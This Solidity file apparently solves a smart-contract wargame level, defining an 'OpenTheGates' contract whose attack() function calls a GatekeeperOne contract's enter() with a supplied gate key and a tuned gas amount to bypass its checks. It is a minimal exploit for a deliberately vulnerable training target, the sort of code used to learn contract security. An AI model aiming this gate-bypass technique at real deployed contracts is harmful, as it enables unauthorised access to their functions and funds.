// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

error GateBreakerOne__CallFailed();

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract OpenTheGates {
    address gatekeeper;

    constructor(address _gatekeeperAddress) {
        gatekeeper = _gatekeeperAddress;
    }

    function attack(bytes8 _gateKey, uint256 _gasToUse) public /* returns (bytes memory) */ {
        GatekeeperOne(gatekeeper).enter{gas: _gasToUse}(_gateKey);
    }
}